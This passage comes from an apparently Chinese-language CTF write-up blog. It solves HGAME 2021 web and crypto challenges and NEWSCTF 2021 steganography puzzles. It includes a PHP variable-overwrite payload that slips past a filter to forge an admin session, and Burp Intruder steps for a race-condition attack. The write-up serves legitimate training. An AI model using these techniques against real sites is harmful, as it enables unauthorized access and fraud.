&quot;GLOBALS&quot;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 直接注册所有变量，这样我就能少打字力，芜湖~</span><br><span class="line"></span><br><span class="line">foreach(array(&#39;_GET&#39;,&#39;_POST&#39;) as $_request)&#123;</span><br><span class="line">    foreach ($$_request as $_k &#x3D;&gt; $_v)&#123;</span><br><span class="line">        foreach ($filter as $youBadBad)&#123;</span><br><span class="line">            $_k &#x3D; str_replace($youBadBad, &#39;&#39;, $_k);</span><br><span class="line">        &#125;</span><br><span class="line">        $&#123;$_k&#125; &#x3D; $_v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 自动加载类，这样我也能少打字力，芜湖~</span><br><span class="line">function auto($class_name)&#123;</span><br><span class="line">    require_once $class_name . &quot;.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(&#39;auto&#39;);</span><br></pre></td></tr></table></figure><p>于是将 <code>_SESSION[username]</code> 这个全局变量进行构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">flag.php?_SESSESSIONSION[username]&#x3D;admin</span><br></pre></td></tr></table></figure><p>最终得到flag：hgame{r4u~i5_@_l@zY-D0G}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1735185186.png"></p><h2 id="2-Post-to-zuckonit"><a href="#2-Post-to-zuckonit" class="headerlink" title="2.Post to zuckonit"></a>2.Post to zuckonit</h2><blockquote><p>d1gg12 新学了HTML，一起来看看他写的在线博客吧！<br>Challenge Address<br><a href="http://zuckonit.0727.site/">http://zuckonit.0727.site</a>:7654</p></blockquote><p>xss</p><h2 id="3-200OK"><a href="#3-200OK" class="headerlink" title="3.200OK!!"></a>3.200OK!!</h2><blockquote><p>今天你 PTSD 了吗？<br>Challenge Address<br><a href="https://200ok.liki.link/">https://200ok.liki.link</a></p></blockquote><p>sql注入</p><h2 id="4-Liki的生日礼物"><a href="#4-Liki的生日礼物" class="headerlink" title="4.Liki的生日礼物"></a>4.Liki的生日礼物</h2><blockquote><p>Liki生日快要到了，她想要一台switch，你能帮帮她么？<br>Challenge Address<br><a href="https://birthday.liki.link/">https://birthday.liki.link</a></p></blockquote><p>考查：条件竞争，在兑换劵时对其抓包然后多线程重复发包</p><p>登录进去可以发现只需购买52张就可以获取flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/451046037.png"></p><p>打开burp进行抓包</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4207973914.png"></p><p>进行intruder，选择Null payloads并生成100个payloads</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1504544233.png"></p><p>选择10进程并发执行</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2669061383.png"></p><p>Start Attack</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3767903207.png"></p><p>刷新页面之后兑换即可得到flag：hgame{L0ck_1s_TH3_S0lllut!on!!!}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3597611091.png"></p><h1 id="0X2Crypto"><a href="#0X2Crypto" class="headerlink" title="0X2Crypto"></a>0X2Crypto</h1><h2 id="1-signin"><a href="#1-signin" class="headerlink" title="1.signin"></a>1.signin</h2><blockquote><p>签到题 233<br>Challenge Address <a href="https://mod.liki.link/">https://mod.liki.link</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line">m = s2n(FLAG)</span><br><span class="line">a = number.getPrime(<span class="number">1024</span>)</span><br><span class="line">p = number.getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">c = a ** p * m % p</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;a = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(a))</span><br><span class="line">print(<span class="string">&quot;p = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p))</span><br><span class="line">print(<span class="string">&quot;c = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line"><span class="comment"># a = 139797327006915116125126834708569781257905890889214772754132967944560239477559427234818170821905966089190947970216980685309703521750454649892247689054657607174600902412798917747263330185879424486123329896583384878012975296270715665441346026354817476240516457708613238092696963533041009088500592879662166253257</span></span><br><span class="line"><span class="comment"># p = 151730388933509920208398125559765127290441122573229308376450817125256445382422908158672019884194306096919838130907844546729851309788163360015419981802510147036452621347724746013834845831207220493241621927858819016342531775639148674368365993683788605987857873546489688725060327903851376240619248166306123462663</span></span><br><span class="line"><span class="comment"># c = 88732386468504387282857878979411728549526363384046769757050721891386416926099771636774309722073926162140997385022007310495636448572530441526048408400076676269906889357399751593581177111658275917266905263737388647978425632263036544709572767498549738915832567940145078140586586992388462314474394590770638444139</span></span><br></pre></td></tr></table></figure><p>m=c ⋅ a^(−1) mod p  =&gt; flag：hgame{M0du1@r_m4th+1s^th3~ba5is-Of=cRypt0!!}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3897441851.png"></p><blockquote><p>费马小定理：如果p是一个质数，而整数a不是p的倍数，则有a^（p-1）≡1（mod p）</p></blockquote><p><strong>附上脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">a = gmpy2.mpz(<span class="number">164082656705280243691125701366387366083595671395343593709662689631005563420712514013315976102671561607316385961761351750099262566476484522886282723886520916918141054995957297228003062477122757133630754605589171370142255727815498152265374544695303477525391985791134432904658602561841437101787689055904235722543</span>)</span><br><span class="line">p = gmpy2.mpz(<span class="number">119737975692964086468800522901334964831462403986044100108042760900964357796378935817727112428450685227062069911631189059668095468384251497619994295762904825142670700856495550090451162130895038569427260669297398177894831568054918372123884561767488134043298231005288709340276215664659982597587377569232740821383</span>) </span><br><span class="line">c = gmpy2.mpz(<span class="number">61634913046503959178216377910203847308428571260648767327608998821120378164975042475439460895394673980137101460250286330274948376187417345460266021486815411513611233649751971142112272707408612929020818762110963149534344745362620646443064201836579453768233731326328543553543287448234680170625258920657056312732</span>)</span><br><span class="line">x = gmpy2.invert(a, p)</span><br><span class="line">m = c * x % p</span><br><span class="line"></span><br><span class="line">print(m) </span><br><span class="line">print(n2s(<span class="built_in">int</span>(m))) </span><br></pre></td></tr></table></figure><h2 id="2-gcd-or-more"><a href="#2-gcd-or-more" class="headerlink" title="2.gcd or more?"></a>2.gcd or more?</h2><blockquote><p>GCD…?<br>Challenge Address <a href="https://more.liki.link/">https://more.liki.link</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line">p = <span class="number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span></span><br><span class="line">q = <span class="number">111614714641364911312915294479850549131835378046002423977989457843071188836271</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">pow</span>(s2n(FLAG), <span class="number">2</span>, n)</span><br><span class="line">print(cipher)</span><br><span class="line"><span class="comment"># 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span></span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/5113">Rabin</a>，跑下脚本得到flag：hgame{3xgCd~i5_re4l1y+e@sy^r1ght?}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/807844213.png"></p><p><strong>附上脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span></span><br><span class="line">p = <span class="number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span></span><br><span class="line">q = <span class="number">111614714641364911312915294479850549131835378046002423977989457843071188836271</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span></span><br><span class="line">    n=p*q</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line">m = rabin_decrypt(c,p,q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="3-WhitegiveRSA"><a href="#3-WhitegiveRSA" class="headerlink" title="3.WhitegiveRSA"></a>3.WhitegiveRSA</h2><blockquote><p>N = 882564595536224140639625987659416029426239230804614613279163<br>e = 65537<br>c = 747831491353896780365654517748216624798517769637260742155527<br>Challenge Address <a href="https://www.baidu.com/">https://www.baidu.com</a></p></blockquote><p>这应该算是RSA入门题吧<br>先对N进行分解得到p,q（①.通过yafu分解n,命令行打开yafu,输入factor(n)即可；②.<a href="http://www.factordb.com/">在线网站</a>）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3209807789.png"></p><p>接着跑下脚本就得出flag：hgame{w0w~yOU_kNoW+R5@!}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2721967567.png"></p><p><strong>附上脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">857504083339712752489993810777</span></span><br><span class="line">q = <span class="number">1029224947942998075080348647219</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">747831491353896780365654517748216624798517769637260742155527</span></span><br><span class="line">n = p * q</span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="4-The-Password"><a href="#4-The-Password" class="headerlink" title="4.The Password"></a>4.The Password</h2><blockquote><p>Hint<br>Challenge Address <a href="https://1.oss.hgame2021.vidar.club/thepassword.html">https://1.oss.hgame2021.vidar.club/thepassword.html</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">The Password</span><br><span class="line">Tinmix和朋友一起去玩密室逃脱,但是由于突发情况,Tinmix被锁在了一间密室里,于是开始四处摸索,昏暗的灯光下,Tinmix发现密室有一块大圆盘,被人工分割成了7块小圆盘,但由于刚开始没注意,每个圆盘已经被旋转过了,但Tinmix记住了旋转的过程和结果</span><br><span class="line">$$</span><br><span class="line">y_1&#x3D;x_1⊕n_1⊕(x_1⋙7)⊕(x_1⋘3) \\</span><br><span class="line">   y_2&#x3D;x_2⊕n_2⊕(x_2⋙4)⊕(x_2⋘9) \\</span><br><span class="line">   y_3&#x3D;x_3⊕n_3⊕(x_3⋙2)⊕(x_3⋘5) \\</span><br><span class="line">   y_4&#x3D;x_4⊕n_4⊕(x_4⋙6)⊕(x_4⋘13) \\</span><br><span class="line">   y_5&#x3D;x_5⊕n_5⊕(x_5⋙8)⊕(x_5⋙16) \\</span><br><span class="line">   y_6&#x3D;x_6⊕n_6⊕(x_6⋙5)⊕(x_6⋘7) \\</span><br><span class="line">   y_7&#x3D;x_7⊕n_7⊕(x_7⋙2)⊕(x_7⋘5) \\</span><br><span class="line">   \\</span><br><span class="line">   (y_1,n_1) &#x3D; (15789597796041222200,14750142427529922)\\</span><br><span class="line">   (y_2,n_2) &#x3D; (8279663441787235887,2802568775308984)\\</span><br><span class="line">   (y_3,n_3) &#x3D; (9666438290109535850,15697145971486341)\\</span><br><span class="line">   (y_4,n_4) &#x3D; (10529571502219113153,9110411034859362)\\</span><br><span class="line">   (y_5,n_5) &#x3D; (8020289479524135048,4092084344173014)\\</span><br><span class="line">   (y_6,n_6) &#x3D; (10914636017953100490,2242282628961085)\\</span><br><span class="line">   (y_7,n_7) &#x3D; (4622436850708129231,10750832281632461)\\</span><br><span class="line">$$</span><br><span class="line">定义</span><br><span class="line">⋙表示循环右移</span><br><span class="line">⋘表示循环左移</span><br><span class="line">⊕表示异或运算</span><br><span class="line">hint</span><br></pre></td></tr></table></figure><p>…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HGAME </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NEWSCTF 2021</title>
      <link href="2021/02/13/2021NEWSCTF/"/>
      <url>2021/02/13/2021NEWSCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="0X1-Misc"><a href="#0X1-Misc" class="headerlink" title="0X1 Misc"></a>0X1 Misc</h1><h2 id="misc签到处"><a href="#misc签到处" class="headerlink" title="misc签到处"></a>misc签到处</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1270498528.jpg"></p><p>binwalk得到了个flag.txt，base64得到flag：flag{Welc0me_t0_newsctf!!!}</p><h2 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h2><blockquote><p><a href="https://wws.lanzous.com/ihGAlldzfmb">https://wws.lanzous.com/ihGAlldzfmb</a>  flag格式：flag{}<br>Hint:steghide</p></blockquote><p>修改rar头文件</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2844222164.png"></p><p>得到以下信息<br>①.背景.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">小林 正在追一部剧,但是他忘了剧名中一位角色的名字,于是他截了个图(好看的剧.png),开始了询问环节.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----你能帮小林认出这是谁嘛</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注:角色名字(中文拼音)是压缩包的密码</span><br></pre></td></tr></table></figure><p>②.好看的剧.png</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1121862733.png"></p><p>③.通过以上信息可以得知压缩包密码： <code>wangtianfeng</code> ；得到niu.jpg</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2798169470.jpg"></p><p>④.key.wav（steghide隐写需要用到的密码）（PS：和GKCTF中Harley Quinn的考点一样）</p><p>最后一小段可以听到拨号声，将其提取出来（因为后面提及的工具只能分析几十秒内的音频QAQ），DTMF，利用 <strong><a href="https://pan.baidu.com/s/1vAG_iXU7zWLzLfxzBiKIkA">工具</a>（提取码：oy3x）</strong> 得到如下信息</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2863462517.png"></p><p><a href="http://dyf.ink/crypto/classical/others/#_24">手机键盘密码</a>解出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key &#x3D; ctfisfun</span><br></pre></td></tr></table></figure><p>最后得到flag(bushi</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1692078918.png"></p><p>划到最底下可以看到以下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">熊曰：呋食很誒咯噔破啽住有歡嗚註嗄和你吃冬註物物眠嗚笨嘍擊笨噤襲你爾咬你爾常破很歡我吖拙歡意擊咯堅有嗷嗥哞怎發唬肉既歡沒破噤咯人和嘶啽更</span><br></pre></td></tr></table></figure><p>很明显是继<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a>之后出来的<a href="http://hi.pcmoe.net/">与熊论道</a>，解得flag：flag{牛年大吉今晚吃鸡今晚吃鸡小年快乐happy}</p><h2 id="EMOJI"><a href="#EMOJI" class="headerlink" title="EMOJI"></a>EMOJI</h2><blockquote><p>EMOJI(笑)<br>Hint：emoji-aes</p></blockquote><p>修改rar头文件</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1342668997.png"></p><p>得到一张图片和加密的压缩包</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2363476616.png"></p><p>不难看出这是长安12时辰那个加密方式</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/992215977.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2155709941.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1648768351.jpg"></p><p>799*248+21=198173，从而解出压缩包密码： <code>一九八一七三</code> </p><p>进而得到以下信息：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1581949352.png"></p><p>最后根据题目尝试<a href="https://aghorler.github.io/emoji-aes/">emoji-aes</a>，得到flag：flag{em0j1_Aes_1s_3_ni5e_3ncr9pt_to0l}</p><h2 id="happy-ox"><a href="#happy-ox" class="headerlink" title="happy ox"></a>happy ox</h2><blockquote><p>这次我们邀请到了牛爷爷来给大家拜个年</p></blockquote><p>lsb 得到压缩包密码： <code>niuniandaji888</code> </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3879285178.png"></p><p>好家伙！又来一层加密…<br>根据文档提示可知是科比密码，对照密码表即可得到压缩包密码：passwdis <code>kbyydsez</code> </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1476229734.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/637737911.jpg"></p><p>最终得到flag：flag{0h_y0u_f1nd_Me_h3ck}</p><h2 id="听说你喜欢薅羊毛"><a href="#听说你喜欢薅羊毛" class="headerlink" title="听说你喜欢薅羊毛"></a>听说你喜欢薅羊毛</h2><blockquote><p>附件地址：<a href="https://wwa.lanzous.com/iNdm7lfooaj">https://wwa.lanzous.com/iNdm7lfooaj</a><br><a href="https://pan.baidu.com/s/1Pc3RlAWW1tzy955TbEwryA">我的附件</a>（提取码：pc1o）</p></blockquote><p>放入010，拖到底部可以看到如下可能是Morse/Bacon的字符串</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3266453861.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011110000010010100101011001110100010001101000100101001101000011010011010010001111010001110011010100010111010000011110100000000110111000000000110100110011000000001110</span><br></pre></td></tr></table></figure><p>尝试培根（0-&gt;a;1-&gt;b）解得passwordistingshuonixihuanyangmao，but这根本无法解开压缩包（PS:这只是JPHS的key）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1635161036.png"></p><p>经过一番折腾，通过JPHS隐写得到压缩包密码： <code>Wdn1His87</code> </p><p>打开brainpower.txt发现文件头竟是ID3，百度已查得知是mp3的文件头</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/562716738.png"></p><p>audacity打开发现最后一段有情况，放大即可得到压缩包密码： <code>PsWdMuzi123</code> </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1379680187.png"></p><p>解得flag.txt（还不是flag.jpg），拉到最后发现是png的文件头倒过来的，<a href="http://tool.huixiang360.com/str/reverse.php">在线工具</a>/脚本倒一下放入010</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3405323143.png"></p><p> <strong>附上脚本：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">content &#x3D; [] </span><br><span class="line">with open(&quot;flag.txt&quot; ) as f: </span><br><span class="line">    for row in f.readline(): </span><br><span class="line">        content.append(row) </span><br><span class="line">content.reverse() </span><br><span class="line"></span><br><span class="line">with open(&quot;galf.txt&quot;,&quot;w&quot; ) as f: </span><br><span class="line">    for row in content: </span><br><span class="line">        f.write(row)</span><br></pre></td></tr></table></figure><p>but还是无法打开，再次查看发现这应该是jpg的，于是将文件头改为jpg的</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2277511102.png"></p><p>最后打开是张二维码，扫码即可得到flag：flag{s0_easy_is_not_it?}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/668102732.png"></p><h2 id="缺斤少两"><a href="#缺斤少两" class="headerlink" title="缺斤少两"></a>缺斤少两</h2><blockquote><p>可恶，大过年的为什么要缺斤少两。  更改题目中的hint1：  原hint：原文长度8  更改为：原文长度9<br>Hint：是guess不是猜<br><a href="https://pan.baidu.com/s/1cw6gyalEpTaKFFNZrwPlBA">附件</a>（提取码：iruz）</p></blockquote><p>先扫扫两张二维码看看有没有啥线索.jpg  ①.谐音梗，扣钱！.png ： 大牛：我也很疑惑呢（PS:异或）  ②.password.png 应该是二维码不全，于是就先将两张图异或一下</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2884195139.png"></p><p>最后补上定位点，扫码得到压缩包密码： <code>password:1q2w3e4r5t6y7u8i</code> </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2133239000.png"></p><p>解开里面有两张图（其中一张名叫passwd，而另一张很有可能就是压缩包了）和一个Hint<br><strong>hint.txt</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密码是靠猜的，不是爆破！</span><br></pre></td></tr></table></figure><p>根据提示推测是outguess隐写，最终得到压缩包密码：news52ctf0</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2545390577.png"></p><p><strong>Polybius.txt</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cipher:iftffsissrssirissr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hint1:\u660e\u6587\u957f\u5ea6\u662f\u0038\uff0c\u4f1a\u4e0b\u68cb\u5417\uff1f</span><br><span class="line">hint2:Zmlyc3Q&#x2F;LGxlbihmaXJzdCk9NQ&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">得到的有意义字符串，作为压缩包密码，才能进入下一层。</span><br></pre></td></tr></table></figure><p>好家伙！hint还加密<br>hint1：明文长度是8，会下棋吗？（PS:题目说这里错了，应该是9）（PS:Unicode）<br>hint2：first?,len(first)=5（PS:base64）</p><p>猜测是棋盘密码（<a href="https://www.yuque.com/u2095721/xhc3mh/xb65yk">棋盘密码-波利比奥斯方阵密码</a>）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1625978581.png"></p><p>而cipher里密文正好是五个字符，于是写个脚本跑一下，可以明显知道是 <code>keyisthis</code> </p><p><strong>附上脚本</strong>（PS:来自BJDCTF-Polybius某大佬的脚本改编）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">s&#x3D;&quot;first&quot;   #修改处</span><br><span class="line">sumresult&#x3D;[]</span><br><span class="line">numsumresult&#x3D;[]</span><br><span class="line">ciper&#x3D;&quot;iftffsissrssirissr&quot;  #修改处</span><br><span class="line">for i in itertools.permutations(s,5):#找出所有全排列</span><br><span class="line">    sumresult.append(&quot;&quot;.join(i))</span><br><span class="line">for i in sumresult:</span><br><span class="line">    temp&#x3D;&quot;&quot;</span><br><span class="line">    for j in ciper:</span><br><span class="line">        temp+&#x3D;str(i.index(j)+1)</span><br><span class="line">    numsumresult.append(temp)</span><br><span class="line">for i in numsumresult:</span><br><span class="line">    ans_&#x3D;&quot;&quot;</span><br><span class="line">    for j in range(0, len(i),2):</span><br><span class="line">        xx&#x3D;(int(i[j])-1)*5+int(i[j+1])+96</span><br><span class="line">        if xx&gt;ord(&#39;i&#39;):</span><br><span class="line">            xx+&#x3D;1</span><br><span class="line">        ans_+&#x3D;chr(xx)</span><br><span class="line">    print(ans_)</span><br></pre></td></tr></table></figure><p>得到的flag.txt居然还不是最终的flag.gif</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">密文：mtHVnkLnIaP3FaW7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">dic&#x3D;JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs????kxyz012789+&#x2F;</span><br><span class="line"></span><br><span class="line">恭喜来到最后一层，你知道base64？，那么解一下吧，得到flag就可以提交了呀。</span><br><span class="line">flag：NEWCTF2021&#123;&#125;</span><br></pre></td></tr></table></figure><p>得到flag：NEWSCTF2021{base64_1s_v3ry_e@sy_and_fuN}</p><p><img 